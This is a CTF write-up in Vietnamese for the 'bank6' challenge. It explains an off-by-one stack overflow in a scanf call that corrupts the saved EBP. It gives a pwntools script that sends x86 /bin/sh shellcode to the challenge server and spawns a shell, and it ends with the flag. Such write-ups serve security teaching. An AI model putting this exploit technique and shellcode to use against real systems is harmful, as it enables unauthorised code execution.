# bank6
## Đề bài
```c
void Register()
{
  char name[1024]; // [esp+Ch] [ebp-40Ch]
  int balance; // [esp+40Ch] [ebp-Ch]

  balance = 0;
  printf("[+] Here is a gift: %p\n", name);
  printf("[+] Please enter your name: ");
  __isoc99_scanf("%1036s", name);
  printf("[+] Thanks for the registration, your balance is %d.\n", balance);
}
```
- Sau khi debug và thử nhập input với độ dài 1036 byte thì nhận thấy rằng địa chỉ thanh ghi `EBP` sau khi `leave` bị mất 1 byte cuối
- Hơn nữa lại biết địa chỉ của biến `name`, lợi dụng điều này thì có thể chèn shellcode vào input, sau đó tính địa chỉ shellcode khi thanh ghi `EBP` bị thay đổi để thực thi đoạn `shellcode` đó
- Shellcode thì có thể tự code, nhưng để cho nhanh thì có thể kiếm đại 1 shellcode /bin/sh x86 nào đó quăng vào và thực thi

## Script
```python3
from pwn import *

r = remote('61.28.237.24', 30207)

print(r.recvuntil('Here is a gift: '))
input_addr = int(r.recvline(), 16)
ebp_addr = (input_addr + 1036 + 16)
new_ebp_addr = (ebp_addr & ~ 0xff) + 4

payload = b'A' * (new_ebp_addr - input_addr)
# print(len(payload))
payload += p32(new_ebp_addr + 4)
payload += b'\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\xC2\x34\xC9\xCD\x80'
payload += (1036 - len(payload)) * b'A'
r.sendline(payload)
r.interactive()
```

Flag: HCMUS-CTF{0ff_by_on3}